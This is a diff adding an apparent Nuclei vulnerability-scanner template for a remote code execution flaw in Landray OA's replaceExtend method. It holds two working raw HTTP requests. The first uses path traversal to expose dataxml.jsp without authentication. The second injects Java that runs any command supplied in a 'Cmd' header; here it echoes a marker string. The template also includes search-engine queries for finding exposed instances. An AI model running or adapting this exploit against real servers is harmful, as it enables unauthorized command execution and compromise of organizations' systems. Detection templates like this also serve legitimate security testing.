@@ -1,0 +1,67 @@
+id: landray-oa-replaceExtend-rce
+
+info:
+  name: Landray OA replaceExtend Function - Remote Code Execution
+  author: adeljck
+  severity: critical
+  description: |
+    There is a remote command execution vulnerability in Lanling OA replaceExtend Method. Use This Method To Move dataxml.jsp To A Dirctory That Can Access Without Auth,Then An attacker can Run Command With this.
+  reference:
+    - https://forum.ywhack.com/thread-203681-1-1.html
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+    hunter-query: web.body=="蓝凌软件",web.icon=="302464c3f6207d57240649926cfc7bd4"
+  tags: landray,oa,dataxml,rce,replaceExtend
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/sys_ui_component/sysUiComponent.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Content-Length: 400
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+
+        ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+        Content-Disposition: form-data; name="method"
+
+        replaceExtend
+        ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+        Content-Disposition: form-data; name="extendId"
+
+        ../../../../resource/help/sys/portal/
+        ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+        Content-Disposition: form-data; name="folderName"
+
+        ../../../ekp/sys/common
+        ------WebKitFormBoundaryL7ILSpOdIhIIvL51--
+      - |
+        POST /resource/help/sys/portal/dataxml.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Content-Length: 17392
+        Cmd: echo 4de0353d63cc9ab4286361a4ff3f12d1
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: SESSION=NWNjYWI3YmUtZTM2Ny00MzY2LTgwN2QtYTdiMzdlOGRlMTg5; Path=/; HttpOnly; SameSite=Lax
+        Connection: close
+
+        s_bean=ruleFormulaValidate&script=try {String cmd = request.getHeader("Cmd");Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "4de0353d63cc9ab4286361a4ff3f12d1"
+        condition: and
+
+      - type: status
+        status:
+          - 200
